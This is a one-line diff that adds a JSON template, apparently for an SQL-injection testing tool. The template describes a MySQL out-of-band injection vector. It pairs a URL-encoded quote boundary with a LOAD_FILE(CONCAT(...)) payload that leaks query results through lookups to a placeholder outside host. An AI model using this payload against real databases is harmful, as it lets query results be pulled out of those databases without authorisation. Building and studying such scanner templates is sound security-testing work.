@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "oob", "boundary": {"prefix": "%27", "suffix": "-- -", "type": "single-enc"}, "vector": "{B} AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({Q}),'.{OOB}\\\\a')))", "comment": "mysql oob: url-enc single"}
